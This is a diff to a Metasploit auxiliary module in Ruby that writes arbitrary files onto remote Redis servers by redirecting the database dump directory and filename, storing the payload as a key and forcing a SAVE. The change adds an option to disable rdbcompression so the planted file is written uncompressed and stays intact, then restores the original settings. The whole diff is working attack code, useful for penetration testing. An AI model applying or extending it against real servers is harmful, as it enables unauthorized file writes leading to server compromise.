@@ -43,7 +43,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
-        OptString.new('RemoteFile', [false, 'Remote file path'])
+        OptString.new('RemoteFile', [false, 'Remote file path']),
+        OptBool.new('DISABLE_RDBCOMPRESSION', [false, 'Disable string compression when dump .rdb databases', true])
       ]
     )
   end
@@ -59,6 +60,7 @@ class Metasploit3 < Msf::Auxiliary
     # XXX: this is a hack -- we should really parse the responses more correctly
     original_dir = redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
     original_dbfilename = redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
+    original_rdbcompression = redis_command('CONFIG', 'GET', 'rdbcompression').split(/\r\n/).last
 
     # set the directory which stores the current redis local store
     data = redis_command('CONFIG', 'SET', 'dir', dirname)
@@ -68,6 +70,17 @@ class Metasploit3 < Msf::Auxiliary
     data = redis_command('CONFIG', 'SET', 'dbfilename', basename)
     return unless data.include?('+OK')
 
+    # Compression string objects using LZF when dump .rdb databases ?
+    # For default that's set to 'yes' as it's almost always a win.
+    # If you want to save some CPU in the saving child set it to 'no' but
+    # the dataset will likely be bigger if you have compressible values or
+    # keys.
+
+    if datastore['DISABLE_RDBCOMPRESSION'] && original_rdbcompression.upcase == 'YES'
+      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no')
+      return unless data.include?('+OK')
+    end
+
     # set a key in this db that contains our content
     # XXX: this does not work well (at all) if the content we are uploading is
     # multiline.  It also probably doesn't work well if the content isn't
@@ -76,6 +89,7 @@ class Metasploit3 < Msf::Auxiliary
     data = redis_command('SET', key, content)
     return unless data.include?('+OK')
     data = redis_command('SAVE')
+
     if data.include?('+OK')
       print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
     else
@@ -87,6 +101,7 @@ class Metasploit3 < Msf::Auxiliary
     # XXX: ensure that these get sent if we prematurely return if a previous command fails
     redis_command('CONFIG', 'SET', 'dir', original_dir)
     redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
+    redis_command('CONFIG', 'SET', 'rdbcompression', original_rdbcompression)
     redis_command('DEL', key)
     redis_command('SAVE')
   end
